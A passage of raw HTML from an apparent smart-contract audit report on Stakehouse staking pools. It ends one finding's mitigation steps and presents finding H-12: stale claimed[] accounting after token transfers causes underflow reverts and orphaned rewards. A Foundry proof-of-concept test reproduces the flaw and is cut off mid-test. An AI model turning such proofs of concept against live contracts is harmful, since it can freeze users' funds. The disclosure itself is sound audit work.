12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ol>\n<li>Add a reentrancy guard to <code>withdrawETHForKnot</code> and <code>stake</code></li>\n<li>Keep proper accounting for ETH deposited by node runner for each BLS key</li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/176\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-12-sender-transferring-giantmevandfeespool-tokens-can-afterward-experience-pool-dos-and-orphaning-of-future-rewards\" style=\"position:relative;\"><a href=\"#h-12-sender-transferring-giantmevandfeespool-tokens-can-afterward-experience-pool-dos-and-orphaning-of-future-rewards\" aria-label=\"h 12 sender transferring giantmevandfeespool tokens can afterward experience pool dos and orphaning of future rewards permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/178\">[H-12] Sender transferring <code>GiantMevAndFeesPool</code> tokens can afterward experience pool DOS and orphaning of future rewards</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/178\">9svR6w</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/358\">JTJabba</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/269\">unforgiven</a>, and <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/206\">aphak5010</a></em></p>\n<p>When a user transfers away GiantMevAndFeesPool tokens, the pool’s claimed[] computed is left unchanged and still corresponds to what they had claimed with their old (higher) number of tokens. (See GiantMevAndFeesPool afterTokenTransfer() - no adjustment is made to claimed[] on the from side.) As a result, their claimed[] may be higher than the max amount they could possibly have claimed for their new (smaller) number of tokens. The erroneous claimed value can cause an integer overflow when the claimed[] value is subtracted, leading to inability for this user to access some functions of the GiantMevAndFeesPool - including such things as being able to transfer their tokens (overflow is triggered in a callback attempting to pay out their rewards). These overflows will occur in SyndicateRewardsProcessor’s _previewAccumulatedETH() and _distributeETHRewardsToUserForToken(), the latter of which is called in a number of places. When rewards are later accumulated in the pool, the user will not be able to claim certain rewards owed to them because of the incorrect (high) claimed[] value. The excess rewards will be orphaned in the pool.</p>\n<h4 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<p>This patch demonstrates both DOS and orphaned rewards due to the claimed[] error described above. Note that the patch includes a temp fix for the separate issue calculating claimed[] in _distributeETHRewardsToUserForToken() in order to demonstrate this is a separate issue.</p>\n<p>Run test</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">forge test -m testTransferDOSUserOrphansFutureRewards</span></span></code></pre>\n<p>Patch</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/liquid-staking/SyndicateRewardsProcessor.sol b/contracts/liquid-staking/SyndicateRewardsProcessor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 81be706..ca44ae6 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/liquid-staking/SyndicateRewardsProcessor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/liquid-staking/SyndicateRewardsProcessor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -60,7 +60,7 @@ abstract contract SyndicateRewardsProcessor {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // Calculate how much ETH rewards the address is owed / due </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             if (due &gt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                claimed[_user][_token] = due;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                claimed[_user][_token] += due; // temp fix claimed calculation</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 totalClaimed += due;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/test/foundry/GiantPools.t.sol b/test/foundry/GiantPools.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 7e8bfdb..6468373 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/test/foundry/GiantPools.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/test/foundry/GiantPools.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -5,14 +5,18 @@ pragma solidity ^0.8.13;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import &quot;forge-std/console.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import { TestUtils } from &quot;../utils/TestUtils.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+import { MockLiquidStakingManager } from &quot;../../contracts/testing/liquid-staking/MockLiquidStakingManager.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import { GiantSavETHVaultPool } from &quot;../../contracts/liquid-staking/GiantSavETHVaultPool.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import { GiantMevAndFeesPool } from &quot;../../contracts/liquid-staking/GiantMevAndFeesPool.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import { LPToken } from &quot;../../contracts/liquid-staking/LPToken.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+import { GiantLP } from &quot;../../contracts/liquid-staking/GiantLP.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import { MockSlotRegistry } from &quot;../../contracts/testing/stakehouse/MockSlotRegistry.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import { MockSavETHVault } from &quot;../../contracts/testing/liquid-staking/MockSavETHVault.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import { MockGiantSavETHVaultPool } from &quot;../../contracts/testing/liquid-staking/MockGiantSavETHVaultPool.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import { IERC20 } from &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+import &quot;forge-std/console.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> contract GiantPoolTests is TestUtils {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     MockGiantSavETHVaultPool public giantSavETHPool;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -116,4 +120,171 @@ contract GiantPoolTests is TestUtils {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         assertEq(dETHToken.balanceOf(savETHUser), 24 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function addNewLSM(address payable giantFeesAndMevPool, bytes memory blsPubKey) public returns (address payable) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        manager = deployNewLiquidStakingNetwork(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            factory,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            admin,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            true,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            &quot;LSDN&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        savETHVault = MockSavETHVault(address(manager.savETHVault()));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        giantSavETHPool = new MockGiantSavETHVaultPool(factory, savETHVault.dETHToken());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // Set up users and ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // Register BLS key</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        registerSingleBLSPubKey(nodeRunner, blsPubKey, accountFour);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // Deposit ETH into giant savETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.prank(savETHUser);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        giantSavETHPool.depositETH{value: 24 ether}(24 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assertEq(address(giantSavETHPool).balance, 24 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // Deploy ETH from giant LP into savETH pool of LSDN instance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        bytes[][] memory blsKeysForVaults = new bytes[][](1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKey);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256[][] memory stakeAmountsForVaults = new uint256[][](1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        giantSavETHPool.batchDepositETHForStaking(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            getAddressArrayFromValues(address(manager.savETHVault())),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            getUint256ArrayFromValues(24 ether),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            blsKeysForVaults,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            stakeAmountsForVaults</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assertEq(address(manager.savETHVault()).balance, 24 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assert(giantFeesAndMevPool.balance &gt;= 4 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        GiantMevAndFeesPool(giantFeesAndMevPool).batchDepositETHForStaking(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            getAddressArrayFromValues(address(manager.stakingFundsVault())),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            getUint256ArrayFromValues(4 ether),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            blsKeysForVaults,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            stakeAmountsForVaults</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // Ensure we can stake and mint derivatives</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        stakeAndMintDerivativesSingleKey(blsPubKey);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        return payable(manager);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function testTransferDOSUserOrphansFutureRewards() public {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 8 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address feesAndMevUserTwo = accountFour;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       // Deposit ETH into giant fees and mev</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.startPrank(feesAndMevUserOne);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        giantFeesAndMevPool.depositETH{value: 8 ether}(8 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.stopPrank();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        MockLiquidStakingManager manager1 = MockLiquidStakingManager(addNewLSM(payable(giantFeesAndMevPool), blsPubKeyOne));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        MockLiquidStakingManager manager2 = MockLiquidStakingManager(addNewLSM(payable(giantFeesAndMevPool), blsPubKeyTwo));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        bytes[][] memory blsPubKeyOneInput = new bytes[][](1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        blsPubKeyOneInput[0] = getBytesArrayFromBytes(blsPubKeyOne);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        bytes[][] memory blsPubKeyTwoInput = new bytes[][](1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        blsPubKeyTwoInput[0] = getBytesArrayFromBytes(blsPubKeyTwo);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.warp(block.timestamp + 3 hours);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // Add 2 eth rewards to manager1&#39;s staking funds vault.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.deal(address(manager1.stakingFundsVault()), 2 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // Claim rewards into the giant pool and distribute them to user one.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.startPrank(feesAndMevUserOne);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        giantFeesAndMevPool.claimRewards(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            feesAndMevUserOne,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            getAddressArrayFromValues(address(manager1.stakingFundsVault())),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            blsPubKeyOneInput);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.stopPrank();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // User one has received all the rewards and has no more previewed rewards.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assertEq(feesAndMevUserOne.balance, 2 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assertEq(giantFeesAndMevPool.totalRewardsReceived(), 2 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assertEq(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            giantFeesAndMevPool.previewAccumulatedETH(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                feesAndMevUserOne,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                new address[](0),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                new LPToken[][](0)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                0);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // Check the claimed[] value for user 1. It is correct.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assertEq(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            giantFeesAndMevPool.claimed(feesAndMevUserOne, address(giantFeesAndMevPool.lpTokenETH())),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            2 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // User one transfers half their giant tokens to user 2.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.startPrank(feesAndMevUserOne);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        giantFeesAndMevPool.lpTokenETH().transfer(feesAndMevUserTwo, 4 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.stopPrank();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // After the tokens have been transferred to user 2, user 1&#39;s claimed[] remains</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // unchanged - and is higher than the accumulated payout per share for user 1&#39;s</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // current number of shares.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assertEq(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            giantFeesAndMevPool.claimed(feesAndMevUserOne, address(giantFeesAndMevPool.lpTokenETH())),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            2 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // With this incorrect value of claimed[] causing a subtraction underflow, user one</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // cannot preview accumulated eth or perform any action that attempts to claim their</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // rewards such as transferring their tokens.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.startPrank(feesAndMevUserOne);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.expectRevert();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        giantFeesAndMevPool.previewAccumulatedETH(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            feesAndMevUserOne,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            new address[](0),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            new LPToken[][](0));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        console.log(&quot;the revert expected now&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        GiantLP token = giantFeesAndMevPool.lpTokenETH();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.expectRevert();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        token.transfer(feesAndMevUserTwo, 1 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.stopPrank();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // Add 1 eth rewards to manager2&#39;s staking funds vault.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.deal(address(manager2.stakingFundsVault()), 2 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // User 2 claims rewards into the giant pool and obtains its 1/2 share.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.startPrank(feesAndMevUserTwo);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       